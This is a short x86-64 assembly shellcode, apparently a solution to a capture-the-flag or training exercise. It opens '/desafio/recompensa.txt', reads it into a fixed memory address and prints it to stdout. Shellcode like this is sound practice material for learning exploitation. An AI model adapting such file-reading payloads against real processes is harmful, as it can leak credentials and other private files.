.intel_syntax noprefix
.global _start
.section .text
_start:
    mov rax, 257
    mov rdi, -100
    lea rsi, [rip + arq]
    xor rdx, rdx
    syscall

    mov rdi, rax

    mov rax, 0
    mov rsi, 0x424242100
    mov rdx, 100
    syscall

    mov rdx, rax

    mov rax, 1
    mov rdi, 1
    mov rsi, 0x424242100
    syscall
    ret
arq: .asciz "/desafio/recompensa.txt"
